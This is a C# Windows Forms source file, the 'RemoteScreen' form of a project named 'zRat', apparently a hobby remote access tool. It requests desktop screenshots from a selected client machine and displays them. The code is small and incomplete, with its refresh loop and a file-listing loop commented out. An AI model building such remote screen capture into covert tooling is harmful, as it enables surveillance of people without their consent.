using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace zRat
{
    public partial class RemoteScreen : Form
    {

        //Capture desktop data
        //
        
        
        private bool RefreshDataNeeded = true;

        private Task refreshData;
        public PictureBox ScreenDisplay;

        private void RefreshScreen()
        {
            while (RefreshDataNeeded)
            {

                CurrentForm.SendMessageToClient(SelectedClientIP, SelectedClientDesktopName, "screen");

                Thread.Sleep(200); //ovo kasnije edituj
            }
        }

        public string SelectedClientIP = "";
        public string SelectedClientDesktopName = "";

        public RemoteScreen()
        {
            InitializeComponent();
        }

        private void OnLoad(object sender, EventArgs e)
        {
            ScreenDisplay = DisplayData;
            //refreshData = Task.Factory.StartNew(() => RefreshScreen());



            //foreach(string CurrentFile in Directory.GetFiles(@"C:\", "*.*"))
            //{
            //    MessageBox.Show(CurrentFile);
            //}
        }

        private void DisplayData_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            CurrentForm.SendMessageToClient(SelectedClientIP, SelectedClientDesktopName, "screen");
        }

        private void OnClose(object sender, FormClosingEventArgs e)
        {
            RefreshDataNeeded = false;
        }
    }
}
